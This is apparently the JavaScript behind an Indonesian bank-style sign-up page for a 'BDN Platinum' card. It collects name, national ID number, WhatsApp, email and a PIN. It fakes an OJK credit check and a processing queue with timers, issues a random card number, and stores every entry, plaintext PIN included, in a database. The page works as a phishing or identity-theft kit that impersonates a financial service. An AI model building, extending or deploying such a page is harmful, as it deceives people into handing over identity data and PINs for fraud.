let currentStep = 1;
const totalSteps = 8;

function nextStep(s) {
    // Validasi Dasar Nama & NIK (Tahap 1)
    if (s === 2) {
        const nama = document.getElementById('inputNama').value.trim();
        const nik = document.getElementById('inputNIK').value.trim();
        const namaRegex = /^[a-zA-Z\s]{3,50}$/;
        
        if (!namaRegex.test(nama)) return alert("Nama ditolak: Hanya boleh huruf & minimal 3 karakter!");
        if (nik.length < 16 || isNaN(nik)) return alert("NIK ditolak: Harus 16 digit angka!");
    }

    // Validasi WA & Email (Tahap 2)
    if (s === 3) {
        const wa = document.getElementById('inputWA').value.trim();
        const email = document.getElementById('inputEmail').value.trim();
        if (wa === "" || email === "") return alert("WhatsApp dan Email wajib diisi!");
        if (!wa.startsWith('08') && !wa.startsWith('62')) return alert("Nomor WhatsApp tidak valid (Gunakan format 08/62)!");
    }
    
    // Validasi PIN (Tahap 5)
    if (s === 6) {
        if (document.getElementById('inputPW').value.length < 6) return alert("PIN harus 6 digit angka!");
    }

    currentStep = s;
    updateUI(s);

    if (s === 6) simulasiAnalisis();
}

function updateUI(s) {
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.getElementById('step' + s).classList.add('active');

    const percent = ((s - 1) / (totalSteps - 1)) * 100;
    document.getElementById('progressLine').style.width = percent + "%";

    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.classList.remove('completed'); c.innerHTML = i + 1; }
        else { c.classList.remove('active', 'completed'); c.innerHTML = i + 1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => { status.innerText = "Memeriksa riwayat finansial di database OJK..."; }, 1500);
    setTimeout(() => { 
        status.innerHTML = "<b style='color:green'>VERIFIKASI BERHASIL</b><br>Skor Kredit: A+ (Sangat Layak)"; 
        btn.style.display = "block";
    }, 4000);
}

async function generateFinal() {
    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui kebijakan layanan!");

    const nama = document.getElementById('inputNama').value.trim();
    const nik = document.getElementById('inputNIK').value.trim();
    const wa = document.getElementById('inputWA').value.trim();
    const email = document.getElementById('inputEmail').value.trim();
    const pin = document.getElementById('inputPW').value;

    const btn = document.getElementById('btnGenerate');
    btn.disabled = true; btn.innerText = "MENGECEK VALIDITAS...";

    try {
        // --- VALIDASI ANTI-DUPLICATE ---
        const qNik = await db.collection("nasabah").where("nik", "==", nik).get();
        const qWa = await db.collection("nasabah").where("wa", "==", wa).get();
        if (!qNik.empty || !qWa.empty) {
            alert("PENDAFTARAN DITOLAK: NIK atau Nomor WhatsApp sudah terdaftar!");
            location.reload(); return;
        }

        updateUI(8);
        startQueueProcess(nama, nik, wa, email, pin);

    } catch (e) { alert("Sistem Sibuk!"); btn.disabled = false; }
}

function startQueueProcess(nama, nik, wa, email, pin) {
    const qStatus = document.getElementById('queueStatus');
    const tDisplay = document.getElementById('timerDisplay');
    
    let qNumber = Math.floor(Math.random() * 40) + 5;
    
    setTimeout(() => { qStatus.innerText = `Posisi Antrean: ${qNumber}/200`; tDisplay.innerText = "Estimasi: 2 Menit lagi"; }, 1000);
    setTimeout(() => { qStatus.innerText = "Sinkronisasi Identitas ke Server Pusat..."; }, 5000);
    setTimeout(() => { qStatus.innerText = "Menerbitkan Nomor Kartu Digital..."; }, 9000);

    const rand = Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');
    const fullNo = "0810" + rand;

    setTimeout(async () => {
        try {
            await db.collection("nasabah").add({
                nama, nik, wa, email, pin, nomor_kartu: fullNo, saldo: 0, tgl_daftar: new Date().toISOString()
            });
            document.getElementById('processingArea').style.display = 'none';
            document.getElementById('finalResult').style.display = 'block';
            document.getElementById('displayNo').innerText = fullNo.match(/.{1,4}/g).join(" ");
            document.getElementById('displayName').innerText = nama.toUpperCase();
        } catch (e) { alert("Koneksi Error!"); }
    }, 13000);
}

function takeScreenshot() {
    html2canvas(document.getElementById('captureArea'), {scale: 3}).then(canvas => {
        const link = document.createElement('a');
        link.download = 'BDN-Platinum-Card.png';
        link.href = canvas.toDataURL();
        link.click();
    });
}
